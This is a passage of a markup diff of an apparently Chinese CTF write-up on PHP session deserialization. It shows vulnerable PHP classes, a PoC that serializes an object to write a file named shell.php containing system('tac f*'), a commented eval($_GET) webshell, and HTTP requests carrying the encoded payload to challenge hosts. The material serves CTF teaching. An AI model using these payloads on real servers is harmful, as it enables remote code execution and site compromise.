class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这个文件看的出来我们要进行session反序列化，并且我们等会序列化的时候要进行base64编码</p>
 <p>然后看<code>check.php</code>,发现什么都没有，但是有提示让看<code>inc.php</code>,截取有用的部分</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里很明显可以进行木马的写入，写个poc</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line">    <span class="comment">/*public $password=&#x27;&lt;?php <span class="doctag">@eval</span>($_GET[a]);?&gt;&#x27;;*/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line">    <span class="comment">/*public $password=&#x27;&lt;?php <span class="doctag">@eval</span>($_GET[a]);?&gt;&#x27;;*/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
 
 <p>本来想直接打入木马的，但是后来发现不行，利用不了，就改成执行命令了</p>
 <p>先在<code>index.php</code>发包，然后再在<code>check.php</code>,最后在<code>log-shell.php</code>看回显就可以了</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show</span><br><span class="line">Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=8stserifuth66e72hl5vmrq1pe; limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo5OiJzaGVsbC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MjU6Ijw/cGhwIHN5c3RlbSgidGFjIGYqIik7Pz4iO3M6Njoic3RhdHVzIjtpOjE7fQ==</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;128&quot;, &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;128&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show</span><br><span class="line">Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=8stserifuth66e72hl5vmrq1pe; limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo5OiJzaGVsbC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MjU6Ijw/cGhwIHN5c3RlbSgidGFjIGYqIik7Pz4iO3M6Njoic3RhdHVzIjtpOjE7fQ==</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;128&quot;, &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;128&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 
 <p>得到重要回显</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Response:</span><br><span class="line"></span><br><span class="line">	function check()&#123;</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			url:&#x27;check.php&#x27;,</span><br><span class="line">			type: &#x27;GET&#x27;,</span><br><span class="line">			data:&#123;</span><br><span class="line">				&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">				&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">			&#125;,</span><br><span class="line">			success:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;,</span><br><span class="line">			error:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Response:</span><br><span class="line"></span><br><span class="line">	function check()&#123;</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			url:&#x27;check.php&#x27;,</span><br><span class="line">			type: &#x27;GET&#x27;,</span><br><span class="line">			data:&#123;</span><br><span class="line">				&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">				&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">			&#125;,</span><br><span class="line">			success:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;,</span><br><span class="line">			error:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
 
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">GET /check.php HTTP/1.1</span><br><span class="line">Host: 20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show</span><br><span class="line">Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=8stserifuth66e72hl5vmrq1pe; limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo5OiJzaGVsbC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MjU6Ijw/cGhwIHN5c3RlbSgidGFjIGYqIik7Pz4iO3M6Njoic3RhdHVzIjtpOjE7fQ==</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;128&quot;, &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;128&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line"></span><br><span class="line">&#123;&quot;0&quot;:&quot;error&quot;,&quot;msg&quot;:&quot;\u767b\u9646\u5931\u8d25&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Request:</span><br><span class="line"></span><br><span class="line">GET /check.php HTTP/1.1</span><br><span class="line">Host: 20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show</span><br><span class="line">Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=8stserifuth66e72hl5vmrq1pe; limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo5OiJzaGVsbC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MjU6Ijw/cGhwIHN5c3RlbSgidGFjIGYqIik7Pz4iO3M6Njoic3RhdHVzIjtpOjE7fQ==</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;128&quot;, &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;128&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://20bacd7d-8ae1-44a9-995b-2f25354757f1.challenge.ctf.show/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line"></span><br><span class="line">&#123;&quot;0&quot;:&quot;error&quot;,&quot;msg&quot;:&quot;\u767b\u9646\u5931\u8d25&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后就可以成功得到<code>flag</code>了</p>
 <h3 id="Demo-3"><a href="#Demo-3" class="headerlink" title="Demo 3"></a>Demo 3</h3><p><code>http://web.jarvisoj.com:32784/</code></p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$m</span>=<span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;demo.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$m</span>=<span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;demo.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>首先触发一个<code>phpinfo</code>,看一些配置</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-204615.png"
-                      alt="6"
-                >这里我们是没有session的上传的点的</p>
+<p><img src="/../images/achieves/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/QQ20240912-204615.png" alt="6">这里我们是没有session的上传的点的</p>
 <p>会涉及到session上传进度的知识</p>
 <blockquote>
-<p>当 <a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled" >session.upload_progress.enabled<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p>
-<p>当一个上传在处理中，同时POST一个与INI中设置的<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name" >session.upload_progress.name<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>同名变量时，上传进度可以在<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.session.php" >$_SESSION<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中获得。 当PHP检测到这种POST请求时，它会在<a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.session.php" >$_SESSION<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中添加一组数据, 索引是 <a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix" >session.upload_progress.prefix<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 与 <a class="link"   target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name" >session.upload_progress.name<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p>
+<p>当 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p>
+<p>当一个上传在处理中，同时POST一个与INI中设置的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> 与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p>
 </blockquote>
